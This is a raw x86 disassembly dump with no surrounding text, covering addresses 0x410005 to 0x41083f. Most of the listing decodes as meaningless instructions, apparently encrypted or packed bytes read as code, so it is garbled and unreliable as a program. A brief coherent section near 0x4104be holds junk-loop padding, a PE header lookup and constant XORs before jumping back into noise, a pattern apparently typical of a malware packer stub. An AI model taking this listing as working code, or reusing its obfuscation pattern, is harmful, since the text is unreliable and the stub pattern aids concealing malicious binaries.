  410005:	imul   edi,DWORD PTR [eax+0x2e33607b],0x4e
  41000c:	mov    al,ds:0x5362f3eb
  410011:	in     eax,0xfb
  410013:	daa    
  410014:	and    al,ch
  410016:	fild   WORD PTR [esi]
  410018:	sbb    edx,DWORD PTR [esi-0x73]
  41001b:	jae    0x410062
  41001d:	xor    al,0xc1
  41001f:	loop   0x40ffb3
  410021:	ror    DWORD PTR [esi-0x47674aa7],cl
  410027:	pop    esp
  410028:	sub    al,BYTE PTR [edx+0x7a]
  41002b:	fs icebp 
  41002d:	jp     0x410001
  41002f:	mov    ebp,0xe791d0ca
  410034:	pop    ebp
  410035:	add    ebp,ebp
  410037:	sub    al,0xcc
  410039:	adc    esi,DWORD PTR [edi+ecx*2+0x14]
  41003d:	mov    eax,0x2de66e0e
  410042:	pop    esp
  410043:	xchg   edx,eax
  410044:	xlat   BYTE PTR ds:[ebx]
  410045:	mov    esp,DWORD PTR [edi]
  410047:	ret    
  410048:	jns    0x40ffef
  41004a:	scas   eax,DWORD PTR es:[edi]
  41004b:	mov    dh,0xc6
  41004d:	mov    edi,0xcf6b029f
  410052:	clc    
  410053:	cs (bad) 
  410056:	inc    edx
  410057:	add    BYTE PTR [ecx],ch
  410059:	cmp    DWORD PTR [edx],esp
  41005b:	sbb    edi,edx
  41005d:	cmp    dh,dh
  41005f:	in     eax,dx
  410060:	mov    bl,BYTE PTR [ebx+0x18]
  410063:	dec    ecx
  410064:	mov    WORD PTR ds:0xa9afc380,?
  41006a:	xlat   BYTE PTR ds:[ebx]
  41006b:	xlat   BYTE PTR ds:[ebx]
  41006c:	mov    ah,0x5e
  41006e:	in     al,0xa0
  410070:	or     BYTE PTR [ecx],bl
  410072:	nop
  410073:	inc    cl
  410075:	pop    esi
  410076:	jle    0x410092
  410078:	ins    DWORD PTR es:[edi],dx
  410079:	hlt    
  41007a:	cld    
  41007b:	xchg   esp,esp
  41007d:	inc    esp
  41007e:	jle    0x410009
  410080:	push   0xa5283461
  410085:	adc    eax,0x32a7a7ab
  41008a:	xchg   ebx,eax
  41008b:	lahf   
  41008c:	push   es
  41008d:	mov    bl,BYTE PTR [eax+0x4f]
  410090:	jle    0x4100ec
  410092:	neg    DWORD PTR ds:0xb6bf41dc
  410098:	pop    ss
  410099:	imul   edi,DWORD PTR [esi],0xe87da06b
  41009f:	jecxz  0x4100a8
  4100a1:	inc    ebx
  4100a2:	push   esi
  4100a3:	gs call 0x90786f6e
  4100a9:	sub    DWORD PTR [eax],0xf2ac8ff1
  4100af:	inc    ecx
  4100b0:	pop    ss
  4100b1:	ret    0xd80c
  4100b4:	(bad)  
  4100b5:	in     eax,0x9c
  4100b7:	gs aad 0xa
  4100ba:	popa   
  4100bb:	pusha  
  4100bc:	out    0x33,eax
  4100be:	mov    cl,BYTE PTR [ecx-0x3ae98330]
  4100c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4100c5:	xchg   edi,eax
  4100c6:	mov    ds:0xf949eaa1,eax
  4100cb:	adc    al,0x84
  4100cd:	cwde   
  4100ce:	push   ss
  4100cf:	mov    ebp,0xdc3e6889
  4100d4:	add    al,0x6e
  4100d6:	test   DWORD PTR [ecx-0x57],ebx
  4100d9:	imul   ecx,esi,0xd20f723
  4100df:	pop    ss
  4100e0:	test   cl,bl
  4100e2:	add    al,0xfd
  4100e5:	repz fwait
  4100e7:	inc    BYTE PTR [esi+0x3a]
  4100ea:	mov    ebx,0xe573b6fb
  4100ef:	imul   esp,DWORD PTR [edx-0x648d5c93],0xfffffff1
  4100f6:	leave  
  4100f7:	adc    DWORD PTR [ecx-0x47],esp
  4100fa:	out    dx,eax
  4100fb:	jns    0x410148
  4100fd:	jne    0x410146
  4100ff:	imul   ecx,DWORD PTR ds:0xa80f8706,0xc5700ef7
  410109:	lahf   
  41010a:	outs   dx,BYTE PTR ds:[esi]
  41010b:	mov    dh,0xe5
  41010d:	test   DWORD PTR [edx+edx*4],0x3459a744
  410114:	cld    
  410115:	imul   edx,DWORD PTR [edi-0x61d571cb],0x3a
  41011c:	aas    
  41011d:	mov    BYTE PTR [ebx-0x38cc03bb],cl
  410123:	pop    edi
  410124:	jmp    0x4104b7
  410129:	push   ecx
  41012a:	clc    
  41012b:	clc    
  41012c:	mov    ebx,0x9c5dbb51
  410131:	test   BYTE PTR [edi-0x56],dh
  410134:	adc    DWORD PTR [ebx+0x57],ecx
  410137:	jnp    0x41015e
  410139:	js     0x41017f
  41013b:	jle    0x4101bb
  41013d:	hlt    
  41013e:	jns    0x4101be
  410140:	jle    0x410189
  410142:	cmc    
  410143:	loop   0x410150
  410145:	stc    
  410146:	out    dx,eax
  410147:	xchg   ebx,eax
  410148:	int    0xe8
  41014a:	shr    bl,1
  41014c:	xchg   edi,eax
  41014d:	xor    esp,esi
  41014f:	gs fsubrp st(5),st
  410152:	push   eax
  410153:	(bad)  
  410154:	fiadd  WORD PTR ds:0xf52bf543
  41015a:	inc    ecx
  41015b:	xor    dl,BYTE PTR [ebp+eax*1-0x5aac0e37]
  410162:	dec    esi
  410163:	dec    ecx
  410164:	ds das 
  410166:	sub    al,0x41
  410168:	pop    ds
  410169:	sbb    ch,BYTE PTR [edi]
  41016b:	pop    ebp
  41016c:	sub    bl,bh
  41016e:	or     al,0x52
  410170:	sub    dh,BYTE PTR [ebx+0x71e1fd2d]
  410176:	fs and ax,0x7c4
  41017b:	dec    esp
  41017c:	xor    eax,0xb0936f47
  410181:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410182:	push   0xe3002d46
  410187:	sti    
  410188:	inc    ebx
  410189:	fdivrp st(2),st
  41018b:	mov    edi,0x3b5c732f
  410190:	xchg   esp,eax
  410191:	mov    ebp,0x45273b8e
  410196:	xor    DWORD PTR [ecx-0x4],0xb56c6ec3
  41019d:	enter  0xd9f,0x88
  4101a1:	or     edi,DWORD PTR [edx+ecx*2+0x2a6ff864]
  4101a8:	xor    eax,0x63f40c08
  4101ad:	inc    esi
  4101ae:	cwde   
  4101af:	mov    bh,0x75
  4101b1:	mov    ds:0x19b621,eax
  4101b6:	mov    al,0x70
  4101b8:	jmp    edx
  4101ba:	lods   eax,DWORD PTR ds:[esi]
  4101bb:	shr    BYTE PTR [eax],0xb7
  4101be:	mov    ch,BYTE PTR [eax]
  4101c0:	fidivr DWORD PTR [ecx+0x6b]
  4101c3:	sbb    BYTE PTR [eax-0x6444debf],dh
  4101c9:	pop    edx
  4101ca:	out    0xcc,eax
  4101cc:	inc    ebp
  4101cd:	mov    ds:0xa8f70e16,al
  4101d2:	pop    ss
  4101d3:	xchg   ebx,eax
  4101d4:	mov    DWORD PTR [edx],edi
  4101d6:	xchg   DWORD PTR [ebp-0x3c],edx
  4101d9:	fmul   DWORD PTR [esi-0x16]
  4101dc:	icebp  
  4101dd:	aam    0xe5
  4101df:	pop    eax
  4101e0:	cmp    bl,ch
  4101e2:	paddw  mm6,QWORD PTR [edx+0x39]
  4101e6:	mov    cl,0xb5
  4101e8:	cmp    DWORD PTR [edi-0x77],eax
  4101eb:	pop    ds
  4101ec:	jle    0x4101f3
  4101ee:	add    ch,BYTE PTR [ebx+0x7fff71f3]
  4101f4:	adc    edx,edi
  4101f6:	mov    ecx,0xb191140e
  4101fb:	mov    BYTE PTR gs:[eax-0x32],dl
  4101ff:	add    ebp,DWORD PTR fs:[ecx+0x3e4c8b29]
  410206:	xor    eax,0x3e94ec6d
  41020b:	xchg   edx,eax
  41020c:	or     ebp,0x458f8cb9
  410212:	mov    dl,0x66
  410214:	dec    eax
  410215:	js     0x4101fa
  410217:	test   BYTE PTR [edi],cl
  410219:	dec    edi
  41021a:	js     0x4101fb
  41021c:	stos   BYTE PTR es:[edi],al
  41021d:	leave  
  41021e:	mov    al,0x35
  410220:	call   0x62be:0x86307cef
  410227:	cmp    eax,0xc2c8897c
  41022c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41022d:	lods   al,BYTE PTR ds:[esi]
  41022e:	mov    bl,0xef
  410230:	ins    BYTE PTR es:[edi],dx
  410231:	repnz mov eax,ds:0xc35dd8c1
  410237:	dec    edx
  410238:	sub    eax,0xb7288128
  41023d:	xor    dl,0xc3
  410240:	(bad)  
  410241:	lahf   
  410242:	add    eax,DWORD PTR [ecx]
  410244:	cli    
  410245:	jno    0x4101c7
  410247:	adc    DWORD PTR [edx-0x364f489],esi
  41024d:	cdq    
  41024e:	push   edi
  41024f:	rcr    ch,1
  410251:	lods   eax,DWORD PTR ds:[esi]
  410252:	aad    0x2b
  410254:	ret    0xddb2
  410257:	jp     0x410293
  410259:	jo     0x410261
  41025b:	jl     0x410284
  41025d:	xchg   edi,eax
  41025e:	gs adc eax,0xa6dbc3d5
  410264:	mov    DWORD PTR [esi-0x2363d1a3],edx
  41026a:	push   cs
  41026b:	js     0x41021c
  41026d:	adc    esi,DWORD PTR [edi-0x70e5a554]
  410273:	xor    al,0x62
  410275:	dec    ecx
  410276:	mov    dh,0x69
  410278:	inc    eax
  410279:	xchg   ebx,eax
  41027a:	sub    DWORD PTR [eax+ebp*8],esp
  41027d:	scas   eax,DWORD PTR es:[edi]
  41027e:	jns    0x4102ac
  410280:	pop    edx
  410281:	or     cl,BYTE PTR [eax+0x14]
  410284:	in     eax,dx
  410285:	cli    
  410286:	cmp    eax,0xafafdef0
  41028b:	mov    BYTE PTR [ecx+0x53],al
  41028e:	test   al,0x98
  410290:	push   ebp
  410291:	test   al,0x32
  410293:	mov    ds:0x355faf,al
  410298:	(bad)  
  410299:	mov    ds:0xf00046b9,al
  41029e:	sbb    eax,0x2d16f77f
  4102a3:	inc    esi
  4102a4:	push   ebp
  4102a5:	adc    eax,0x5b771cc2
  4102aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4102ab:	cmp    ecx,DWORD PTR [eax+0x6b15ee70]
  4102b1:	sar    eax,cl
  4102b3:	inc    ebx
  4102b4:	mov    dh,0x74
  4102b6:	cmp    eax,0x7c494af7
  4102bb:	cmp    al,0xd5
  4102bd:	ret    0x829d
  4102c0:	mov    esp,0xbc872ffc
  4102c5:	hlt    
  4102c6:	clc    
  4102c7:	mov    DWORD PTR ds:0x2f39aab1,edi
  4102cd:	stc    
  4102ce:	inc    ecx
  4102cf:	sbb    esp,0x26
  4102d2:	inc    ecx
  4102d3:	jbe    0x410266
  4102d5:	imul   ecx,ecx,0x5a688ca5
  4102db:	stc    
  4102dc:	aaa    
  4102dd:	pop    ss
  4102de:	test   eax,0xdf2d3d68
  4102e3:	fdiv   st(6),st
  4102e5:	xlat   BYTE PTR ds:[ebx]
  4102e6:	in     eax,dx
  4102e7:	sti    
  4102e8:	xor    ch,0xe6
  4102eb:	push   eax
  4102ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4102ed:	pop    ss
  4102ee:	add    ecx,DWORD PTR [esi+eax*4-0x6b6496a9]
  4102f5:	mov    ds:0xaadf084,eax
  4102fa:	pop    ss
  4102fb:	pusha  
  4102fc:	das    
  4102fd:	sbb    al,0xef
  4102ff:	adc    DWORD PTR [edx],esp
  410301:	pop    ss
  410302:	enter  0x1d3c,0x76
  410306:	fcomp  QWORD PTR [ebx]
  410308:	cmc    
  410309:	ss mov ch,0x64
  41030c:	xor    eax,0x6a1939ac
  410311:	dec    esi
  410312:	mov    ds:0x6219493d,eax
  410317:	imul   DWORD PTR ds:0x53f04004
  41031d:	mov    esp,DWORD PTR cs:[ebp+0x613c9a8c]
  410324:	stos   DWORD PTR es:[edi],eax
  410325:	into   
  410326:	adc    BYTE PTR [esp+eiz*4-0x62a6e1f2],bh
  41032d:	(bad)  
  41032e:	xlat   BYTE PTR ds:[ebx]
  41032f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410330:	pop    ds
  410331:	inc    edi
  410332:	xor    ebx,DWORD PTR [eax+ebx*8-0x2dbc1a07]
  410339:	enter  0xac1,0xea
  41033d:	mov    edx,0x15bf810c
  410342:	inc    ebp
  410343:	in     eax,dx
  410344:	xor    BYTE PTR ds:0x7d3875d6,dh
  41034a:	jns    0x41038e
  41034c:	pop    ss
  41034d:	pop    eax
  41034e:	add    BYTE PTR [ebx+edi*1-0x3feecfbf],dl
  410355:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410356:	ss fwait
  410358:	inc    edx
  410359:	retf   0x56e4
  41035c:	dec    eax
  41035d:	or     edx,DWORD PTR [edx-0x34]
  410360:	in     al,0x57
  410362:	push   ss
  410363:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410364:	pusha  
  410365:	and    eax,0x3cf48bb3
  41036a:	cmp    ecx,ecx
  41036c:	sahf   
  41036d:	dec    ebx
  41036e:	in     eax,0xa2
  410370:	adc    ebp,DWORD PTR [esi]
  410372:	fwait
  410373:	loop   0x4103e9
  410375:	dec    ecx
  410376:	shl    DWORD PTR [ebx],1
  410378:	mov    bh,0xaf
  41037a:	or     BYTE PTR [edx-0x20],dh
  41037d:	lds    ebp,FWORD PTR [edx+0x3d]
  410380:	mov    dl,0x83
  410382:	sub    BYTE PTR [eax+0x63],al
  410385:	xor    DWORD PTR [ecx+0x64c3f538],esp
  41038b:	jb     0x410316
  41038d:	adc    al,0xa5
  41038f:	mov    dl,0xec
  410391:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410392:	dec    edi
  410393:	xor    al,0x2b
  410395:	rcr    bl,cl
  410397:	mov    ch,0x85
  410399:	push   ecx
  41039a:	dec    ebx
  41039b:	cld    
  41039c:	sbb    ah,ch
  41039e:	outs   dx,BYTE PTR ds:[esi]
  41039f:	mov    ah,0x5
  4103a1:	lods   eax,DWORD PTR ds:[esi]
  4103a2:	jmp    0x410415
  4103a4:	cmp    al,0x8e
  4103a6:	jmp    0x356f0eae
  4103ab:	out    0xcd,eax
  4103ad:	sbb    BYTE PTR [edx-0x32],dl
  4103b0:	mov    ebp,0x134d0d4c
  4103b5:	sbb    eax,0x3ccfa18b
  4103ba:	sbb    al,0x5c
  4103bc:	test   DWORD PTR ds:0xbf60e0d8,eax
  4103c2:	ds inc ebp
  4103c4:	push   es
  4103c5:	and    DWORD PTR [esi-0x3a1c7bf5],0xb34c58a0
  4103cf:	loopne 0x410363
  4103d1:	pop    edx
  4103d2:	je     0x4103b8
  4103d4:	add    BYTE PTR [ebp-0x73ef626a],bl
  4103da:	aam    0xb3
  4103dc:	or     BYTE PTR [ecx-0x42],al
  4103df:	(bad)  
  4103e0:	in     eax,0xda
  4103e2:	pop    ds
  4103e3:	dec    edi
  4103e4:	xchg   edx,eax
  4103e5:	mov    BYTE PTR [ecx+0x12f48d0c],cl
  4103eb:	sub    eax,0x7943932a
  4103f0:	cli    
  4103f1:	inc    ebp
  4103f2:	adc    eax,0x5b2a56a1
  4103f7:	and    eax,0x9a6f56d4
  4103fc:	sub    BYTE PTR [ecx+eax*1-0x69],al
  410400:	fwait
  410401:	sub    eax,0xec2fba5a
  410406:	xchg   ebp,eax
  410407:	adc    DWORD PTR [ebp-0x9],ecx
  41040a:	(bad)  
  41040b:	hlt    
  41040c:	mov    bh,0xa5
  41040e:	sti    
  41040f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410410:	mov    edi,0x5435cf8d
  410415:	cmc    
  410416:	clc    
  410417:	ret    0x73ee
  41041a:	sub    al,0xd2
  41041c:	iret   
  41041d:	imul   DWORD PTR [eax-0x16]
  410420:	std    
  410421:	scas   eax,DWORD PTR es:[edi]
  410422:	das    
  410423:	cmc    
  410424:	popf   
  410425:	fs inc ebx
  410427:	mov    dl,0x3e
  410429:	jns    0x410484
  41042b:	xchg   BYTE PTR [edi-0x60],al
  41042e:	xor    eax,0xb3d5ebe
  410433:	sbb    edx,DWORD PTR [ecx]
  410435:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410436:	mov    DWORD PTR [esi+edi*8-0x47835b7a],edx
  41043d:	adc    eax,0xa395a45b
  410442:	test   BYTE PTR [edx-0x30],bh
  410445:	xor    al,0x6f
  410447:	cmp    eax,0xc96a04aa
  41044c:	adc    esi,DWORD PTR [eax-0x60]
  41044f:	and    DWORD PTR [eax+0x1202fcbf],0x7f
  410456:	push   es
  410457:	jno    0x41042d
  410459:	xchg   ebx,eax
  41045a:	sbb    al,0xa3
  41045c:	mov    ah,0xf5
  41045e:	adc    esp,edi
  410460:	jmp    0x4104a0
  410462:	xor    al,0x44
  410464:	jmp    0x1a423541
  410469:	pop    es
  41046a:	mov    ah,0x42
  41046c:	add    ebp,DWORD PTR [eax]
  41046e:	dec    ecx
  41046f:	aam    0xb8
  410471:	(bad)  
  410474:	(bad)  
  410475:	fmul   st,st(6)
  410477:	lea    ebx,[edi-0x5f5e9d16]
  41047d:	add    al,0x72
  41047f:	inc    ebp
  410480:	addr16 pushf 
  410482:	ret    
  410483:	add    al,0x6a
  410485:	sub    eax,0xe7588fbd
  41048a:	shl    BYTE PTR [ecx+0x65],cl
  41048d:	push   esi
  41048e:	stc    
  41048f:	call   0x4f02ef36
  410494:	xchg   edi,eax
  410495:	cli    
  410496:	sbb    eax,0x2b3e4fd4
  41049b:	out    dx,al
  41049c:	cmp    dh,al
  41049e:	push   edi
  41049f:	test   al,0xa5
  4104a1:	jl     0x4104f5
  4104a3:	(bad)  
  4104a5:	ss xchg esp,eax
  4104a7:	inc    ebx
  4104a8:	adc    DWORD PTR [ebx],edi
  4104aa:	sahf   
  4104ab:	aas    
  4104ac:	mov    ecx,0x27eb37c2
  4104b1:	pop    ebx
  4104b2:	add    al,0x32
  4104b4:	pop    ebx
  4104b5:	jge    0x4104d9
  4104b7:	add    eax,esi
  4104b9:	pop    esi
  4104ba:	leave  
  4104bb:	ret    0xc
  4104be:	push   ebp
  4104bf:	mov    ebp,esp
  4104c1:	push   ecx
  4104c2:	mov    DWORD PTR [ebp-0x4],0xf89c8536
  4104c9:	mov    DWORD PTR ds:0x4345f7,0x1f
  4104d3:	cmp    DWORD PTR ds:0x4345f7,0x0
  4104da:	je     0x410527
  4104e0:	cmp    DWORD PTR ds:0x4345f7,0x10
  4104e7:	jne    0x4104f6
  4104ed:	push   DWORD PTR [ebp-0x28]
  4104f0:	call   DWORD PTR ds:0x41335c
  4104f6:	cmp    DWORD PTR ds:0x4345f7,0x11
  4104fd:	jne    0x41050e
  410503:	mov    eax,ds:0x4345f7
  410508:	dec    eax
  410509:	mov    ds:0x4345f7,eax
  41050e:	xor    eax,eax
  410510:	add    eax,DWORD PTR ds:0x4345f7
  410516:	dec    eax
  410517:	mov    ds:0x4345f7,eax
  41051c:	jmp    0x4104d3
  410521:	xor    DWORD PTR ds:0x434647,ebx
  410527:	mov    eax,DWORD PTR [ebp+0x8]
  41052a:	and    DWORD PTR ds:0x43468f,0x434713
  410534:	mov    al,BYTE PTR [eax]
  410536:	add    al,0x3a
  410538:	xor    al,0x44
  41053a:	cmp    al,0xc3
  41053c:	mov    DWORD PTR ds:0x43464f,0x7f5c
  410546:	jne    0x410979
  41054c:	and    edx,DWORD PTR ds:0x434687
  410552:	mov    eax,DWORD PTR [ebp+0x8]
  410555:	and    DWORD PTR ds:0x4345eb,0x0
  41055f:	jmp    0x410571
  410564:	mov    edx,DWORD PTR ds:0x4345eb
  41056a:	inc    edx
  41056b:	mov    DWORD PTR ds:0x4345eb,edx
  410571:	cmp    DWORD PTR ds:0x4345eb,0x1c
  410578:	jae    0x4105c7
  41057e:	cmp    DWORD PTR ds:0x4345eb,0xc
  410585:	jne    0x4105a6
  41058b:	push   0x1ce2
  410590:	push   DWORD PTR [ebp-0x24]
  410593:	push   0x6804
  410598:	push   DWORD PTR [ebp-0x18]
  41059b:	push   0x869f
  4105a0:	call   DWORD PTR ds:0x4130d4
  4105a6:	cmp    DWORD PTR ds:0x4345eb,0xb
  4105ad:	jne    0x4105c2
  4105b3:	xor    edx,edx
  4105b5:	or     edx,DWORD PTR ds:0x4345eb
  4105bb:	inc    edx
  4105bc:	mov    DWORD PTR ds:0x4345eb,edx
  4105c2:	jmp    0x410564
  4105c7:	mov    ecx,DWORD PTR [ebp+0x8]
  4105ca:	add    ecx,DWORD PTR [eax+0x3c]
  4105cd:	mov    edx,0x7510851
  4105d2:	mov    DWORD PTR [ebp+0x8],ecx
  4105d5:	mov    eax,DWORD PTR [ebp-0x4]
  4105d8:	xor    eax,edx
  4105da:	push   esi
  4105db:	jmp    0x410796
  4105e0:	mov    ebp,0x6da24588
  4105e5:	jae    0x410664
  4105e7:	mov    DWORD PTR [eax],ecx
  4105e9:	sub    esi,DWORD PTR [esi+ecx*2]
  4105ec:	aaa    
  4105ed:	stos   DWORD PTR es:[edi],eax
  4105ee:	inc    esi
  4105ef:	or     eax,0x7e7e47f6
  4105f4:	pushf  
  4105f5:	jg     0x410675
  4105f7:	jle    0x4105d6
  4105f9:	les    ebp,FWORD PTR [ebx]
  4105fb:	adc    ah,BYTE PTR ds:0xf80a2f0e
  410601:	or     al,BYTE PTR [eax+0x16be67bb]
  410607:	in     eax,dx
  410608:	mov    bh,0xcd
  41060a:	fnsave [ebx]
  41060c:	add    eax,0x42f8c601
  410611:	int    0xaf
  410613:	test   al,0x35
  410615:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410616:	and    bh,0xf8
  410619:	and    esp,DWORD PTR [ebp+0x3d6b73ee]
  41061f:	aad    0xcf
  410621:	and    al,0x52
  410623:	jnp    0x4106a0
  410625:	ds (bad) 
  410627:	sub    eax,0xa29be9f2
  41062c:	mov    dl,cl
  41062e:	(bad)  
  410630:	sbb    eax,DWORD PTR [ecx+0x50]
  410633:	ret    
  410634:	mov    esp,0xcb159729
  410639:	fld    TBYTE PTR [edi]
  41063b:	mov    ss,ebx
  41063d:	mov    ebx,eax
  41063f:	popf   
  410640:	adc    eax,0x95c11fdc
  410645:	mov    al,ds:0x85983d65
  41064a:	int3   
  41064b:	test   edi,ebx
  41064d:	retf   
  41064e:	mov    eax,ds:0x1b913fa3
  410653:	bound  eax,QWORD PTR [edx]
  410655:	xchg   edi,eax
  410656:	adc    eax,0x48c371a4
  41065b:	add    al,0xbb
  41065d:	xchg   ecx,eax
  41065e:	pop    eax
  41065f:	xchg   esp,eax
  410660:	mov    al,ds:0xc45cd7ed
  410665:	mov    bh,0x76
  410667:	call   0xaf43:0x72944fd
  41066e:	sbb    ah,BYTE PTR [ecx+edi*1+0x369c5814]
  410675:	sbb    DWORD PTR [esi-0x72],esp
  410678:	inc    ebx
  410679:	mov    bh,0x22
  41067b:	popa   
  41067c:	xor    cl,BYTE PTR [ebx-0x5e5b153b]
  410682:	pop    ecx
  410684:	mov    es,ebx
  410686:	lods   eax,DWORD PTR ds:[esi]
  410687:	push   eax
  410688:	fstp   DWORD PTR [eax]
  41068a:	jge    0x4106ea
  41068c:	xor    eax,0xb6ae056f
  410691:	xor    dl,BYTE PTR [eax+0x3a40eb87]
  410697:	add    al,0x1f
  410699:	push   ds
  41069a:	sbb    al,0x4a
  41069c:	es hlt 
  41069e:	(bad)  
  41069f:	or     ecx,DWORD PTR [esi+0x5d99e276]
  4106a5:	fs inc ebx
  4106a7:	pop    ds
  4106a8:	in     eax,dx
  4106a9:	sbb    ecx,0x9648950f
  4106af:	mov    ecx,DWORD PTR [edx]
  4106b1:	mov    al,0xc2
  4106b3:	mov    edi,0x23cd61c7
  4106b8:	popa   
  4106b9:	xchg   esi,eax
  4106ba:	mov    BYTE PTR [edi+0x63],bh
  4106bd:	test   al,0x2f
  4106bf:	rcr    dh,1
  4106c1:	cs dec edx
  4106c3:	push   ebx
  4106c4:	pop    ds
  4106c5:	sub    DWORD PTR [edx],ebp
  4106c7:	xchg   esi,eax
  4106c8:	sub    eax,0x62f62502
  4106cd:	lock cwde 
  4106cf:	call   0x27b0ef77
  4106d4:	aas    
  4106d5:	jmp    0x44b0:0xb25c663d
  4106dc:	stos   BYTE PTR es:[edi],al
  4106dd:	bound  ecx,QWORD PTR [edi+ebp*8]
  4106e0:	fcom   st(4)
  4106e2:	out    0x25,eax
  4106e4:	into   
  4106e5:	das    
  4106e6:	xor    BYTE PTR [ebx+0x42],dh
  4106e9:	xchg   edi,eax
  4106ea:	sahf   
  4106eb:	int    0x48
  4106ed:	loope  0x410709
  4106ef:	cdq    
  4106f0:	inc    esi
  4106f1:	mov    al,al
  4106f3:	stos   BYTE PTR es:[edi],al
  4106f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4106f5:	repnz out 0x10,eax
  4106f8:	rcl    DWORD PTR [eax-0x4d],cl
  4106fb:	push   esp
  4106fc:	rcl    DWORD PTR [edi],1
  4106fe:	imul   edi,DWORD PTR [esi+0x2e9c1989],0xa49834f7
  410708:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410709:	in     al,0xd8
  41070b:	das    
  41070c:	btr    DWORD PTR [edi],eax
  41070f:	in     al,0xe4
  410711:	in     al,0x6e
  410713:	scas   eax,DWORD PTR es:[edi]
  410714:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410715:	(bad)  
  410716:	jo     0x4106ee
  410718:	sar    DWORD PTR [esi-0x5b0eecd5],1
  41071e:	push   ebp
  41071f:	popf   
  410720:	and    DWORD PTR [edx],edx
  410722:	xchg   ebx,eax
  410723:	mov    ebp,0xc70ba743
  410728:	push   0xb9051184
  41072d:	clc    
  41072e:	(bad)  
  41072f:	fs clc 
  410731:	ss inc edx
  410733:	arpl   bp,cx
  410735:	dec    ebp
  410736:	cmc    
  410737:	es mov ebx,0x539c295b
  41073d:	mov    ah,0x1
  41073f:	pop    ss
  410740:	call   FWORD PTR [eax+0x67]
  410743:	popa   
  410744:	sub    esi,DWORD PTR [ecx-0x7e70d6a4]
  41074a:	xchg   esi,eax
  41074b:	mov    DWORD PTR [esi],eax
  41074d:	add    dl,BYTE PTR [edi+0x48]
  410750:	sbb    al,BYTE PTR [esi+0x6d]
  410753:	(bad)  
  410754:	pop    ebp
  410755:	test   ebx,edx
  410757:	push   ebx
  410758:	xlat   BYTE PTR ds:[ebx]
  410759:	iret   
  41075a:	in     al,0xfc
  41075c:	add    al,0x39
  41075e:	mov    edx,0x6d7704d3
  410763:	rcr    BYTE PTR [ebp-0x70],1
  410766:	mov    ebp,ebp
  410768:	or     al,0x92
  41076a:	sub    eax,ecx
  41076c:	xor    DWORD PTR ds:0x2dad7929,edi
  410772:	mov    DWORD PTR [ebp-0x3d],esi
  410775:	loope  0x4107c1
  410777:	leave  
  410778:	gs std 
  41077a:	adc    cl,bh
  41077c:	sub    cl,dl
  41077e:	sti    
  41077f:	iret   
  410780:	ins    DWORD PTR es:[edi],dx
  410781:	push   ebp
  410782:	mov    ah,0xdc
  410784:	inc    sp
  410786:	adc    DWORD PTR [edi+0x2cf7b446],eax
  41078c:	or     eax,0x4f9ac15e
  410791:	int    0xe
  410793:	mov    ch,0xf3
  410795:	lea    ecx,[ebx-0x6646f78b]
  41079b:	jb     0x4107cf
  41079d:	add    cl,ch
  41079f:	mov    dh,0x1
  4107a1:	add    BYTE PTR [eax],al
  4107a3:	cmc    
  4107a4:	mov    al,BYTE PTR [esi+ecx*8+0x65]
  4107a8:	enter  0xb575,0x7e
  4107ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4107ad:	mov    dl,0x1f
  4107af:	dec    ebp
  4107b0:	mov    bl,0xf8
  4107b2:	ret    0x4114
  4107b5:	jle    0x410835
  4107b7:	pushf  
  4107b8:	jg     0x410838
  4107ba:	jle    0x410777
  4107bc:	lahf   
  4107bd:	lds    eax,FWORD PTR [eax-0x28]
  4107c0:	dec    edi
  4107c1:	jno    0x4107f8
  4107c3:	in     al,dx
  4107c4:	sbb    DWORD PTR [esp+eax*8-0x467197de],ecx
  4107cb:	sub    esp,DWORD PTR [esi]
  4107cd:	pop    edx
  4107ce:	adc    DWORD PTR [ebp+0x61],ebp
  4107d1:	cli    
  4107d2:	daa    
  4107d3:	push   ecx
  4107d4:	jo     0x410833
  4107d6:	cmp    BYTE PTR [edx+0x72],dl
  4107d9:	cld    
  4107da:	aam    0x33
  4107dc:	repz rcl BYTE PTR [ebx],0xc1
  4107e0:	mov    ah,0xdc
  4107e2:	clc    
  4107e3:	fdiv   DWORD PTR [ecx+edi*1+0x5bb4d378]
  4107ea:	mov    dh,0xd3
  4107ec:	dec    ecx
  4107ed:	in     eax,dx
  4107ee:	ss mov ebp,0x2dae1c5f
  4107f4:	sti    
  4107f5:	fstp   TBYTE PTR [ebx]
  4107f7:	mov    DWORD PTR [bx+di-0x7f9d],ebx
  4107fc:	or     edi,edi
  4107fe:	addr16 fld st(5)
  410801:	mov    dl,0x5e
  410803:	scas   eax,DWORD PTR es:[edi]
  410804:	daa    
  410805:	add    bl,dh
  410807:	xor    DWORD PTR [eax+0x32],esp
  41080a:	jle    0x41084c
  41080c:	shl    DWORD PTR [edi],cl
  41080e:	pushf  
  41080f:	sar    DWORD PTR [ebp+0x6bf7c402],cl
  410815:	dec    ebp
  410816:	mov    eax,ds:0x152b410c
  41081b:	int    0x18
  41081d:	xchg   edi,eax
  41081e:	outs   dx,DWORD PTR ds:[esi]
  41081f:	and    eax,0xe77f7894
  410824:	sub    DWORD PTR [esi+0x586308c3],ebp
  41082a:	pop    ss
  41082b:	dec    eax
  41082c:	pop    ebx
  41082d:	out    0x49,al
  41082f:	adc    dh,dl
  410831:	mov    ch,0xbe
  410833:	cmp    edx,DWORD PTR [edx]
  410835:	pop    es
  410836:	jle    0x410818
  410838:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410839:	mov    eax,0xf435d96a
  41083e:	ret    
  41083f:	mov    DWORD PTR [ebp+ebp*4-0x7],edi
